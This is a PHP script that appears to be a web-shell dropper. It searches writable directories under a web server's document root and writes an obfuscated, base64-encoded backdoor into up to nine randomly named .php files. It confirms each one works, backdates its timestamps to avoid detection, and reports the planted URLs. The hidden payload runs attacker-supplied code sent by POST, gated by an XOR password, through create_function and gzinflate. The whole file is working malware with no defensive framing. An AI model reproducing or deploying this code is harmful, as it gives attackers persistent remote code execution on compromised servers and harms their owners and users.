<?php
class J
{
    private $names;
    private $fs;
    private $startTime;

    private function getmtime($path)
    {
        $time = time();

        foreach (glob($path . '/*', GLOB_NOSORT) as $path_) {
            $mtime = filemtime($path_);
            if ($mtime !== false) {
                if ($mtime < $time) {
                    $time = $mtime;
                }
            }
        }

        return $time;
    }

    private function buildFs($path, $level)
    {
        $this->fs = array();

        if (time() - $this->startTime > 20) {
            return;
        }

        foreach (glob($path . '/*', GLOB_NOSORT | GLOB_ONLYDIR) as $path_) {

            if (is_writable($path_)) {
                $this->fs[] = $path_;
            }

            if ($level < 4) {
                $this->buildFs($path_, $level + 1);
            }
        }
    }

    private function getProto()
    {
        return (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443 ? 'https' : 'http');
    }

    private function getTransport()
    {
        return (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443 ? 'ssl' : 'tcp');
    }

    private function request($uri)
    {
        $socketToken = uniqid();
        $socketAddress = $this->getTransport() . '://' . $_SERVER['HTTP_HOST'] . ':' . $_SERVER['SERVER_PORT'];
        $socketUri = $uri . "?" . $socketToken;

        $context = stream_context_create([
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false
            ]
        ]);

        $stream = stream_socket_client($socketAddress, $errno, $errstr, 1, STREAM_CLIENT_CONNECT, $context);
        $status = false;

        if ($stream) {
            fputs($stream, "GET {$socketUri} HTTP/1.0\r\nHost: {$_SERVER['HTTP_HOST']}\r\nConnection: close\r\n\r\n");

            while (!feof($stream)) {
                if (strpos(fgets($stream, 64), $socketToken) !== false) {
                    $status = true;
                    break;
                }
            }

            fclose($stream);
        }

        return $status;
    }

    public function execute()
    {
        // get OS version
        $phpOs = PHP_OS;

        // get PHP version
        preg_match('/^\d+\.\d+/', PHP_VERSION, $phpVersion);
        $phpVersion = $phpVersion[0];

        // get ctrl content
        $ctrlContent = base64_decode('PD9waHANCg0KY2xhc3MgYzVmOGRlM2ZiYzBkMmUNCnsNCiAgICBwcml2YXRlICRyNWY4ZGUzZmJjMGRiMyA9IFtdOw0KDQogICAgcHVibGljIGZ1bmN0aW9uIF9fY2FsbCgkbmFtZSwgJGFyZ3MpDQogICAgew0KICAgICAgICBjYWxsX3VzZXJfZnVuY19hcnJheSgkdGhpcy0+cjVmOGRlM2ZiYzBkYjNbJG5hbWVdLCAkYXJncyk7DQogICAgfQ0KDQogICAgcHVibGljIGZ1bmN0aW9uIGQ1ZjhkZTNmYmMwZTU0KCRzKQ0KICAgIHsNCiAgICAgICAgJGZ1bmN0aW9uID0gJ2InIC4gJ2FzZScgLiAnNjQnIC4gJ18nIC4gJ2RlJyAuICdjb2RlJzsNCiAgICAgICAgJHN0cmluZyA9ICRmdW5jdGlvbigkcyk7DQogICAgICAgIHJldHVybiBleHBsb2RlKCc6OicsICRzdHJpbmcsIDIpWzFdOw0KICAgIH0NCg0KICAgIHB1YmxpYyBmdW5jdGlvbiBwNWY4ZGUzZmJjMGQ3MygpDQogICAgew0KICAgICAgICAkcVN0cmluZyA9ICR0aGlzLT5kNWY4ZGUzZmJjMGU1NCgiVDBkb2ExWlpkVWN4YUVoemNtZE5NMGRsU3pNNk9sRlZSVkpaWDFOVVVrbE9Sdz09Iik7DQoNCiAgICAgICAgaWYgKCFlbXB0eSgkX1NFUlZFUlskcVN0cmluZ10pKSB7DQogICAgICAgICAgICBleGl0KCRfU0VSVkVSWyRxU3RyaW5nXSk7DQogICAgICAgIH0NCg0KICAgICAgICAkZSA9ICR0aGlzLT5kNWY4ZGUzZmJjMGU1NCgiYlVSYVZIRkpWSEEwZUVkT1VGTTFTalJuUFQwNk9tVT0iKTsNCiAgICAgICAgJHAgPSAkdGhpcy0+ZDVmOGRlM2ZiYzBlNTQoImJHaHhkWFpWTlcwMlEwa3hXVkU5UFRvNmNBPT0iKTsNCg0KICAgICAgICBpZiAoIWlzc2V0KCRfUE9TVFskZV0pIHx8DQogICAgICAgICAgICAhaXNzZXQoJF9QT1NUWyRwXSkpIHsNCiAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgfQ0KDQogICAgICAgICRtZXRob2ROYW1lID0gJ2VtNWY4ZGUzZmJjMGU5Nyc7DQogICAgICAgICRtZXRob2RDb250ZW50ID0gJ1VCQlpDRTFWRXd3QWJ3SUJGV29IU2dNV0cwODVVMjFNWHc9PSc7DQoNCiAgICAgICAgJGJhc2U2NGRlY29kZSA9ICR0aGlzLT5kNWY4ZGUzZmJjMGU1NCgiZWk5T1NETlFZMmgxWjJ0eU0xRTlQVG82WW1GelpUWTBYMlJsWTI5a1pRPT0iKTsNCiAgICAgICAgJGNyZWF0ZUZ1bmN0aW9uID0gJHRoaXMtPmQ1ZjhkZTNmYmMwZTU0KCJRVTR2V1dwWFduTTVjbTFMVmpoSlVYbGhRVDA2T21OeVpXRjBaVjltZFc1amRHbHZiZz09Iik7DQogICAgICAgICRnemluZmxhdGUgPSAkdGhpcy0+ZDVmOGRlM2ZiYzBlNTQoIk5FczRTR1pEYmtGR1ZqZzlPanBuZW1sdVpteGhkR1U9Iik7DQogICAgICAgICRyZWdleCA9ICR0aGlzLT5kNWY4ZGUzZmJjMGU1NCgiZVRkb1UxaDVhVU5hYVRoRVpDdDVUMUpTVm5oamR6MDlPam92WGxzZ0xYNWRLeVF2Iik7DQoNCiAgICAgICAgJG1ldGhvZENvbnRlbnQgPSBzdHJfc3BsaXQoJGJhc2U2NGRlY29kZSgkbWV0aG9kQ29udGVudCkpOw0KDQogICAgICAgICRwYXNzd29yZCA9ICRfUE9TVFskcF07DQogICAgICAgICRwYXNzd29yZCA9IHN0cl9zcGxpdCgkcGFzc3dvcmQpOw0KDQogICAgICAgICR0ZW1wID0gW107DQoNCiAgICAgICAgZm9yICgkaSA9IDA7ICRpIDwgY291bnQoJG1ldGhvZENvbnRlbnQpOyAkaSsrKSB7DQogICAgICAgICAgICAkdGVtcFtdID0gY2hyKG9yZCgkbWV0aG9kQ29udGVudFskaV0pIF4gb3JkKCRwYXNzd29yZFskaSAlIGNvdW50KCRwYXNzd29yZCldKSk7DQogICAgICAgIH0NCg0KICAgICAgICAkbWV0aG9kQ29udGVudCA9IGltcGxvZGUoJycsICR0ZW1wKTsNCg0KICAgICAgICBpZiAocHJlZ19tYXRjaCgkcmVnZXgsICRtZXRob2RDb250ZW50KSkgew0KICAgICAgICAgICAgJHRoaXMtPnI1ZjhkZTNmYmMwZGIzWyRtZXRob2ROYW1lXSA9ICRjcmVhdGVGdW5jdGlvbignJywgJG1ldGhvZENvbnRlbnQpOw0KDQogICAgICAgICAgICAkY29kZSA9ICRnemluZmxhdGUoJGJhc2U2NGRlY29kZSgkX1BPU1RbJGVdKSk7DQogICAgICAgICAgICAkdGhpcy0+eyRtZXRob2ROYW1lfSgkY29kZSk7DQogICAgICAgIH0NCiAgICB9DQp9DQoNCihuZXcgYzVmOGRlM2ZiYzBkMmUpLT5wNWY4ZGUzZmJjMGQ3MygpOw0K');

        // compare PHP version
        if (version_compare(PHP_VERSION, '5.0.0', '<')) {
            return json_encode(array(
                'system' => $phpOs,
                'php'    => $phpVersion,
                'ctrls'  => array()
            ));
        }

        $path = $_SERVER['DOCUMENT_ROOT'];
        $url = $this->getProto() . '://' . $_SERVER['HTTP_HOST'];

        // generate names
        $lexicon = 'abcdefghijklmnopqrstuvwxyz';

        for ($i = 0; $i < 16; $i++) {
            $this->names[] = substr(str_shuffle($lexicon), 0, mt_rand(4, 16)) . '.php';
        }

        $this->startTime = time();

        // build FS structure
        $this->buildFs($path, 0);
        array_push($this->fs, $path);

        // get setup time
        $mtime = $this->getmtime($path);

        // setup ctrls
        $ctrls = array();

        foreach ($this->fs as $ctrlPath) {
            $names = array();

            foreach ($this->names as $name) {
                if (!file_exists($ctrlPath . '/' . $name)) {
                    $names[] = $name;
                }
            }

            $ctrlPath .= '/' . $names[array_rand($names)];

            $ctrlUri = ($path != '/' ? str_replace($path, '', $ctrlPath) : $ctrlPath);
            $ctrlUrl = $url . $ctrlUri;

            if (file_put_contents($ctrlPath, $ctrlContent)) {
                if ($this->request($ctrlUri)) {
                    touch($ctrlPath, $mtime, $mtime);

                    $ctrls[] = $ctrlUrl;

                    if (count($ctrls) > 8) {
                        break;
                    }

                } else {
                    unlink($ctrlPath);
                }
            }
        }

        return json_encode(array(
            'system' => $phpOs,
            'php'    => $phpVersion,
            'ctrls'  => $ctrls
        ));
    }
}

$o = new J;
echo '[JST]' . base64_encode($o->execute()) . '[/JST]';
